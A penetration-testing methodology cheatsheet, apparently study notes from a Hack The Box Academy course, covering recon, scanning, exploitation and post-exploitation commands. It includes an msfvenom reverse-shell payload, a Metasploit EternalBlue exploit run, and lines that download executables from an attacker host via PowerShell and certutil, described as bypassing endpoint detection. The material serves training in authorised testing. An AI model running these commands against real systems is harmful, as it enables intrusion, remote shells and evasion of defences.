Penetration Testing Process & Cheatsheet

Difficulty: Fundamental Category: Methodology Platform: HTB Academy Date: October 2024

A structured methodology and quick-reference cheatsheet for conducting penetration tests based on the Hack The Box Pentester Path.

📋 Overview

This document provides a structured methodology for conducting penetration tests, ensuring thoroughness and repeatability. It maps out the 5 key stages of an assessment alongside command references for standard tools.

Core Methodology: 1. Reconnaissance ➔ 2. Scanning and Enumeration ➔ 3. Exploitation ➔ 4. Post-Exploitation ➔ 5. Reporting.

InfoSec Foundations:

  • CIA Triad: Confidentiality, Integrity, Availability.
  • Threats vs Vulnerabilities: Always consider the contextual risk to business assets.

🔍 Reconnaissance

Establishing connectivity and performing initial host discovery to map out the target environment.

1. VPN Connection

sudo openvpn --config <your-config-file>.ovpn

2. Host Discovery (Nmap Ping Scan)

nmap -sn <IP-Range>

3. OSINT (Domain Info)

whois <Domain-Name>
Key Finding: A simple ping sweep helps rapidly identify live hosts without triggering heavy port-scan alerts. WHOIS establishes baseline ownership.

🔎 Enumeration & Scanning

Deep scanning of discovered hosts to identify open ports, running services, and web directories.

1. Nmap Port & Service Scanning

  • Full Port Scan:
nmap -p 1-65535 <IP-Address>
  • Service Version & Script Scanning:
nmap -sC -sV -oN nmap_initial <IP-Address>

2. Web Enumeration & Fuzzing

  • Directory Brute-Forcing (Gobuster):
gobuster dir -u http://<IP-Address> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster_results.txt
  • Virtual Host Fuzzing (Gobuster):
gobuster vhost -u http://<Domain> -w <Wordlist> --append-domain
  • Advanced Fuzzing (FFUF):
ffuf -u http://<IP-Address>/FUZZ -w <Wordlist>

3. Network Service Enumeration

  • NFS Shares:
showmount -e <IP-Address>
  • SNMP Walk (Public Community String):
snmpwalk -v 2c -c public <IP-Address>

⚡ Exploitation

Identifying confirmed vulnerabilities and leveraging frameworks or manual exploits to gain initial access.

1. Vulnerability Scanning (Nessus & OpenVAS)

nessus -q -x -i <scan.xml>

2. Finding Exploits

searchsploit <software name/version>

3. Payload Generation (MSFvenom)

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<My-IP> LPORT=4444 -f exe -o shell.exe

4. Exploitation Framework (Metasploit)

msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <IP-Address>
run

5. Remote Access Methods

  • SSH via Private Key:
ssh -i id_rsa user@<IP-Address>
  • RDP Connection:
xfreerdp /v:<IP-Address> /u:user /p:'password'
⚠️ Important: Always ensure you have a stable listener configured (LHOST/LPORT) before executing reverse shell payloads.

🎯 Post-Exploitation

Securing access, escalating privileges, transferring files, and pivoting through the network.

1. Shell Stabilization

python3 -c 'import pty; pty.spawn("/bin/bash")'

2. File Transfers

  • Windows Download (PowerShell):
Invoke-WebRequest -Uri http://<Attacker-IP>/file.exe -OutFile C:\Temp\file.exe
  • Windows Download (Certutil LOLBAS):
certutil.exe -verifyctl -split -f http://<Attacker-IP>/file.exe
  • Linux / Windows Raw TCP Transfer:
nc <Target-IP> 4444 < payload.exe
  • RDP Drive Redirection:
xfreerdp /v:<IP-Address> /u:user /p:pass /drive:linux,/path/to/local/folder
✅ Success: Once initial access is achieved, immediately focus on upgrading primitive shells to interactive TTYs before executing complex enumeration scripts.

📚 Key Learnings

  • Methodology is King: Following a structured methodology is crucial for ensuring the effectiveness and efficiency of a penetration test. Skipping steps usually leads to missed attack vectors.
  • The CIA Triad: Forms the foundation of all information security assessments.
  • Living Off The Land: Utilizing built-in binaries (LOLBAS/GTFOBins) like certutil or powershell helps bypass endpoint detection.
  • Pentest Distributions: Operating systems like Parrot OS come pre-configured with the required toolsets, drastically reducing setup time and environment troubleshooting.

🛠️ Tools Used

  • OpenVPN: Secure tunneling into lab/client environments.
  • Nmap: Industry standard for network discovery and port scanning.
  • Gobuster & FFUF: Tools for mapping web application attack surfaces and fuzzing parameters.
  • Searchsploit: Command-line utility for searching Exploit-DB.
  • Metasploit & MSFvenom: Modular framework for developing payloads and executing exploit code.
  • Nessus & OpenVAS: Comprehensive vulnerability scanning solutions.
  • xfreerdp & snmpwalk: Protocol-specific access and enumeration utilities.
